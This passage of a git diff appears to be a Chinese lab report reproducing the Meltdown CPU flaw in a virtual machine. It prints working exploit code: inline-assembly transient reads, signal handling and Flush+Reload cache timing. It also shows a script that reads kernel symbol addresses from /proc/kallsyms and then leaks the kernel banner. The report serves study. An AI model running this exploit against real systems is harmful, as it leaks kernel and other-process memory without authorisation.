@@ -34,3 +34,106 @@ CPU在乱序执行过程中，分支后的指令都会被装入流水线中预�
 - 物理机 - Windows 7 ver 6.1.7601, Intel® Core™ i5-7400 CPU @ 3.00GHz 
 - 虚拟机 - Ubuntu 4.8.4-2ubuntu1~14.04.3, running on VMware® Workstation 14 Pro 14.1.2 build-8497320
 
+使用[Spectre & Meltdown Checker](https://github.com/speed47/spectre-meltdown-checker.git)检测虚拟机是否受Meltdown漏洞影响   
+检测发现受到Meltdown影响   
+![meltdown](meltdown_checker.png)
+
+## 具体实现
+代码参照[paboldin/meltdown-exploit](https://github.com/paboldin/meltdown-exploit)   
+首先主函数从命令行参数中接受需要访问的非法起始地址以及需要读取的字节数（十六进制），并且开始攻击。从起始地址开始，每次对当前地址利用Meltdown漏洞攻击尝试读取100次（默认值），以其中出现次数最多的元素认为是该地址内的真实内容。   
+首先我们需要处理的一个问题是对于SIGSEGV信号的处理，如果我们不理会该信号，那么信号一旦产生便会导致我们的程序终止，因此必须写一个Signal Handler来处理信号。这里采用CSAPP第八章Shell Lab中所提供的一个`sigaction`函数的wrapper。对于SIGSEGV信号的处理，我们当然想让收到这个信号后便停止核心的攻击汇编代码的进行，转而执行从cache中利用Flush+Reload技术分析代码的过程。这里运用`sigsetjmp`函数和`siglongjmp`函数的组合。如果attack过程判断不是由SIGSEGV信号返回的时候才执行攻击代码。   
+核心攻击代码：
+```c
+static void __attribute__((noinline)) meltdown_attack(char* addr)
+{
+    if (!sigsetjmp(jmp_buffer, 1)) {
+    __asm__ volatile(
+		".rept 300\n\t"
+		"add $0x141, %%rax\n\t"
+		".endr\n\t"
+
+        "retry:\n\t"
+		"movzx (%[addr]), %%rax\n\t"
+        "shl $12, %%rax\n\t"
+        "mov (%[target], %%rax, 1), %%rbx\n\t"
+		"jz retry\n"
+        :
+		: [target] "r" (cache),
+		  [addr] "r" (addr)
+		: "rax","rbx"
+	);
+    }
+    else return;
+}
+```
+这部分采用gcc内联汇编，主体上与论文中的代码相同，唯一需要注意的部分是刚开始重复进行了300次加法指令，这里是为了产生一个延迟。之后采用了`movzx`而不是`mov`，主要是使得在读取到`%rax`寄存器中的低位时将高位清除，从而保证访问的chche line的正确性。   
+从cache数据中用Flush+Reload技术提取攻击代码获取到的内存信息的函数是`recover_secret`，这个函数就是直接对256个不同的内存地址进行探测，为了避免cachen对线性探查进行预测，我们每次读取之前都随机化访问的序列，访问序列存储在`probe_sequence`中，每次探查之前都调用标准库`algorithm`的`random_shuffle`函数对齐重新排列。
+```c
+uint8_t recover_secret(void)
+{
+    int value_probe;
+    char *addr;
+
+    int time;
+    int min_time = INT_MAX;
+    int hit_value = 0;
+
+    std::random_shuffle(probe_sequence.begin(), probe_sequence.end());
+    for (int i = 0; i != possible_value_nums; ++i)
+    {
+        value_probe = probe_sequence[i];
+        addr = (char *) ((unsigned long) cache + value_probe * page_size);
+        time = get_access_time(addr);
+        if (time < min_time)
+        {
+            hit_value = value_probe;
+            min_time = time;
+        }
+    }
+    return hit_value;
+}
+```
+对于读取一个字节的函数的实现就很显而易见了
+```c
+int read_byte(char* addr)
+{
+    static char buf[256];
+    memset(cache, 0, page_size * possible_value_nums);
+    if (pread(fd, buf, sizeof(buf), 0) < 0)
+        unix_error((char *) "pread failed");
+    flush_cache();
+    meltdown_attack(addr);
+    return recover_secret();
+}
+```
+首先清空cache数组的值，然后清空掉cache，之后进行攻击，调用`recover_secret`函数返回读取内容。   
+需要注意的是，我们的程序需要打开和读取`/proc/version`，这个操作是为了使得访问的`linux_proc_banner`常驻在内存中，不会被刷新掉。
+## 实验结果
+### 调用Shell脚本
+```shell
+make clean
+make
+linux_proc_banner=$(sudo cat /proc/kallsyms | grep linux_proc_banner | sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p')
+echo $linux_proc_banner
+./meltdown $linux_proc_banner 57
+echo "----------------"
+echo "from /proc/version:"
+cat /proc/version
+make clean
+```
+Shell脚本的编写参考[理解CPU芯片漏洞：Meltdown与Spectre](https://blog.csdn.net/gjq_1988/article/details/79138505)和[paboldin/meltdown-exploit](https://github.com/paboldin/meltdown-exploit) 
+### 运行结果
+![result](result.png)
+## 附：读取本进程中的内存数据
+在实现对`linux_proc_banner`的越权访问之前，还尝试实现了一下对本进程的用户态数据进行读取。   
+在本repo的第一次commit中可以找到相关代码。程序中保存了一个C风格字符串全局变量
+> To be or not to be is a question.
+
+攻击程序成功读取出该字符串。 
+![result](result_user_space.png)
+
+## 参考资料
+- Meltdown by Lipp, Schwarz, Gruss, Prescher, Haas, Mangard, Kocher, Genkin, Yarom, and Hamburg
+- Computer Systems: A Programmer's Perspective, 3/E (CS:APP3e)
+- https://github.com/paboldin/meltdown-exploit
+- https://blog.csdn.net/gjq_1988/article/details/79138505
